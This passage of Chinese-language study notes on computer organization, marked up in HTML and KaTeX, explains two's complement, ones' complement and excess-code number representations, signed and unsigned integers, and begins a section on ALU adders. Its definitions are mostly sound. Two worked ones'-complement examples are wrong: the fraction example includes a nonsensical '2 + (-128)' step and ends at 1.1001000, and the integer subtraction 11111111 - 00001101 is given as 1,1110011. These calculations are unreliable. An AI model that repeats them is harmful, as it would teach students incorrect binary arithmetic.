<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">[</mo><mi>x</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo separator="true">,</mo><mspace width="8.109em"></mspace><mn>0</mn><mo>≤</mo><mi>x</mi><mo>&lt;</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>4</mn><mo>+</mo><mi>x</mi><mo>=</mo><mn>4</mn><mo>−</mo><mi mathvariant="normal">∣</mi><mi>x</mi><mi mathvariant="normal">∣</mi><mo separator="true">,</mo><mspace width="1.4226em"></mspace><mo>−</mo><mn>1</mn><mo>&lt;</mo><mi>x</mi><mo>≤</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext>&nbsp;</mtext><mn>4</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">
[x]_\text{补} =
\begin{cases}
x, \hspace{2.85cm} 0 \leq x \lt 1 \\
4 + x = 4 - |x|, \hspace{0.5cm} -1 \lt x \leq 0
\end{cases}
(mod \space 4)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:8.109em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1.4226em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace">&nbsp;</span><span class="mord">4</span><span class="mclose">)</span></span></span></span></span></p>
<p>模 4 补码双符号位 00 表示正，11 表示负，用在完全算术运算的 ALU 部件中。</p>
<p>将 [x]<sub>补</sub> 的符号位与数值位一起右移并保持原符号位的值不变，可实现除法功能。</p>
</li>
<li>
<p><strong>反码表示法</strong>：反码通常作为由原码求补码或由补码求原码的中间过渡</p>
<p>负数的补码可采用各位取反，末位加 1 的方法得到，如果 <strong>仅各位求反而末尾不加 1</strong>，那么就可得到负数的反码表示。因此 <strong>负数反码的定义</strong> 就是在相应的补码表示中末位减 1。正数反码的定义和相应的补码（或原码）表示相同。</p>
<p><strong>纯小数的反码定义：</strong></p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">[</mo><mi>x</mi><msub><mo stretchy="false">]</mo><mtext>反</mtext></msub><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo separator="true">,</mo><mspace width="7.3977em"></mspace><mn>0</mn><mo>≤</mo><mi>x</mi><mo>&lt;</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mn>2</mn><mo>−</mo><msup><mn>2</mn><mrow><mo>−</mo><mi>n</mi></mrow></msup><mo stretchy="false">)</mo><mo>+</mo><mi>x</mi><mo separator="true">,</mo><mspace width="1.4226em"></mspace><mo>−</mo><mn>1</mn><mo>&lt;</mo><mi>x</mi><mo>≤</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext>&nbsp;</mtext><mn>2</mn><mo>−</mo><msup><mn>2</mn><mrow><mo>−</mo><mi>n</mi></mrow></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">
[x]_\text{反} =
\begin{cases}
x, \hspace{2.6cm} 0 \leq x \lt 1 \\
(2 - 2^{-n}) + x, \hspace{0.5cm} -1 \lt x \leq 0
\end{cases}
(mod \space 2 - 2^{-n})
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">反</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:7.3977em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7713em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1.4226em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace">&nbsp;</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0713em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8213em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p>
<p>例如：x<sub>1</sub> = +0.0110，x<sub>2</sub> = -0.0110，字长为 <code>8</code> 位。</p>
<p>反码表示为：</p>
<ul>
<li>[x<sub>1</sub>]<sub>反</sub> = 0.0110000</li>
<li>[x<sub>2</sub>]<sub>反</sub> = (2 - 2<sup>-7</sup>) + (-0.0110) = 2 + (-128) - 0.0110000 = 10.0000000 + 1.1111111 - 0.0110000 = 11.1111111 - 0.0110000 = 11.1001000 = 1.1001000</li>
</ul>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>由于字长为 <code>8</code> 位，所以将负数的反码最高位去掉</p>
</div>
<p>若字长为 <code>n + 1</code>，则反码小数的表示范围为 -(1 - 2<sup>-n</sup>) ≤ x ≤ 1 - 2<sup>-n</sup>（关于原点对称），与原码相同。</p>
<p><strong>纯整数的反码定义：</strong></p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">[</mo><mi>x</mi><msub><mo stretchy="false">]</mo><mtext>反</mtext></msub><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo><mi>x</mi><mo separator="true">,</mo><mspace width="7.2555em"></mspace><mn>0</mn><mo>≤</mo><mi>x</mi><mo>&lt;</mo><msup><mn>2</mn><mi>n</mi></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><msup><mn>2</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mi>x</mi><mo separator="true">,</mo><mspace width="1.4226em"></mspace><mo>−</mo><msup><mn>2</mn><mi>n</mi></msup><mo>&lt;</mo><mi>x</mi><mo>≤</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext>&nbsp;</mtext><msup><mn>2</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">
[x]_\text{反} =
\begin{cases}
0,x, \hspace{2.55cm} 0 \leq x \lt 2^n \\
(2^{n+1} - 1) + x, \hspace{0.5cm} -2^n \lt x \leq 0
\end{cases}
(mod \space 2^{n+1} - 1)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">反</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:7.2555em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1.4226em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace">&nbsp;</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p>
<p>例如：x<sub>1</sub> = +1010，x<sub>2</sub> = -1101，字长为 <code>8</code> 位。</p>
<p>反码表示为：</p>
<ul>
<li>[x<sub>1</sub>]<sub>反</sub> = 0,0001010</li>
<li>[x<sub>2</sub>]<sub>反</sub> = (2<sup>(7+1)</sup> - 1) + (-1101) = 2<sup>8</sup> - 1 - 1101 = 100000000 - 00000001 - 00001101 = 11111111 - 00001101 = 1,1110011</li>
</ul>
<p>若字长为 <code>n + 1</code>，则反码整数的表示范围为 -(2<sup>n</sup> - 1) ≤ x ≤ 2<sup>n</sup> - 1（关于原点对称），与原码相同。</p>
<p><strong>反码表示存在以下几个方面的不足：</strong></p>
<ul>
<li><code>0</code> 的表示不唯一（即存在正负 0），[+0]<sub>反</sub> = <strong>0</strong>0000；[-0]<sub>反</sub> = <strong>1</strong>1111</li>
<li>表示范围比补码少一个最小负数</li>
</ul>
<p>反码在计算机中很少使用，通常用作数码变换的中间表示形式。</p>
<p>反码跟原码是正数时，一样；负数时，反码就是原码符号位除外，其他位按位取反。</p>
</li>
<li>
<p><strong>移码表示法</strong>：移码常用来表示浮点数的阶码。只能表示整数</p>
<p>移码就是在真值 X 上加上一个常数（偏置值），通常这个常熟取 2<sup>n</sup>，相当于 X 在数轴上向正方向偏移了若干单位。</p>
<p><strong>移码定义：</strong></p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">[</mo><mi>x</mi><msub><mo stretchy="false">]</mo><mtext>移</mtext></msub><mo>=</mo><msup><mn>2</mn><mi>n</mi></msup><mo>+</mo><mi>x</mi><mtext>（</mtext><mo>−</mo><msup><mn>2</mn><mi>n</mi></msup><mo>≤</mo><mi>x</mi><mo>&lt;</mo><msup><mn>2</mn><mi>n</mi></msup><mtext>，其中机器字长为&nbsp;&nbsp;n&nbsp;+&nbsp;1）</mtext></mrow><annotation encoding="application/x-tex">
[x]_\text{移} = 2^n + x \text{（}-2^n \leq x \lt 2^n \text{，其中机器字长为 \space n + 1）}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">移</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7977em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">x</span><span class="mord text"><span class="mord cjk_fallback">（</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8504em;vertical-align:-0.136em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7977em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">，其中机器字长为</span><span class="mord">&nbsp;&nbsp;n&nbsp;+&nbsp;1</span><span class="mord cjk_fallback">）</span></span></span></span></span></span></p>
<p>例如：x<sub>1</sub> = +10101，x<sub>2</sub> = -10101，字长为 <code>8</code> 位。</p>
<p>若字长为 <code>n + 1</code>，则移码整数的表示范围为 -2<sup>n</sup> ≤ x ≤ 2<sup>n</sup> - 1</p>
<p>移码表示为：</p>
<ul>
<li>[x<sub>1</sub>]<sub>移</sub> = 2<sup>7</sup> + 10101 = 128 + 00010101 = 10000000 + 00010101 = 1,0010101</li>
<li>[x<sub>2</sub>]<sub>移</sub> = 2<sup>7</sup> + (-10101) = 128 - 10101 = 10000000 - 00010101 = 0,1101011</li>
</ul>
<p><strong>移码特点：</strong></p>
<ul>
<li>移码中零的表示唯一，[+0]<sub>移</sub> = 2<sup>n</sup> + 0 = [-0]<sub>移</sub> = 2<sup>n</sup> - 0 = <strong>1</strong>00……0（n 个 <code>0</code>）</li>
<li>一个真值的移码和补码仅差一个符号位，[x]<sub>补</sub>的符号位取反即得[x]<sub>移</sub>（“1” 表示正，“0” 表示负，这与其他机器数的符号位取值正好相反），反之亦然</li>
<li>移码全 <code>0</code> 时，对应真值的最小值 -2<sup>n</sup>；移码全 <code>1</code> 时，对应真值的最大值 2<sup>n</sup> - 1</li>
<li>移码保持了数据原有的大小顺序，移码大真值就大，移码小真值就小</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>原码、补码、反码和移码这四种编码表示的总结</strong></p>
<ul>
<li>原码、补码、反码的符号位相同，正数的机器码相同</li>
<li>原码、反码的表示在数轴上对称，二者都存在 <code>+0</code> 和 <code>-0</code> 两个零</li>
<li>补码、移码的表示在数轴上不对称，零的表示唯一，它们比原码、反码多表示一个数</li>
<li>整数的补码、移码的符号位相反，数值位相同</li>
<li>负数的反码、补码末位相差 <code>1</code></li>
<li>原码很容易判断大小。而负数的反码、补码很难直接判断大小，可采用如下规则快速判断：对于负数，数值部分越大，绝对值越小，真值越大（更靠近 <code>0</code>）</li>
</ul>
</li>
</ol>
<h4> 整数的表示</h4>
<ol>
<li>
<p><strong>无符号整数表示</strong></p>
<p>当一个编码的 <strong>全部二进制位均为数值位而没有符号位</strong> 时，该编码表示就是无符号整数，也直接称为 <strong>无符号数</strong>。此时，默认数的符号为正。由于无符号整数省略了一位符号位，所以在字长相同的情况下，它能表示的最大数比带符号整数能表示的大。例如：<code>8</code> 位无符号整数，对应的表示范围为 0~2<sup>8</sup> - 1，即最大数为 <code>255</code>，而 <code>8</code> 位带符号整数的最大数是 <code>127</code>。</p>
<p>一般在全部是正数运算且不出现负值结果的场合下，使用无符号整数表示。例如：可用无符号整数进行地址运算，或用它来表示指针。</p>
</li>
<li>
<p><strong>带符号整数的表示</strong></p>
<p>将符号数值化，并将符号位放在有效数字的前面，就组成了带符号整数。虽然上面介绍的原码、补码、反码和移码都可以用来表示带符号整数，但补码表示有其明显的优势：</p>
<ul>
<li>与原码和反码相比，<code>0</code> 的补码表示唯一</li>
<li>与原码和移码相比，补码运算规则比较简单，且符号位可以和数值位一起参加运算</li>
<li>与原码和反码相比，补码比原码和反码多表示一个最小负数</li>
</ul>
<p>计算机中的带符号整数都用补码表示，故 <code>n</code> 位带符号整数的表示范围是 -2<sup>n-1</sup>~2<sup>n-1</sup> - 1。</p>
</li>
</ol>
<h3> 运算方法和运算电路</h3>
<h4> 基本运算部件</h4>
<p>在计算机中，<strong>运算器</strong> 由算术逻辑单元（Arithmetic Logic Unit，ALU）、移位器、状态寄存器和通用寄存器组等组成。运算器的基本功能包括加、减、乘、除四则运算，与、或、非、异或等逻辑运算，以及移位、求补等操作。<code>ALU</code> 的核心部件是 <strong>加法器。</strong></p>
<ol>
<li>
<p><strong>一位全加器</strong></p>
<p>全加器（FA）是 <strong>最基本的加法单元</strong>，有加数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">A_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>、加数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">B_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 与低位传来的进位 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">C_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span> 共三个输入，有本位和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 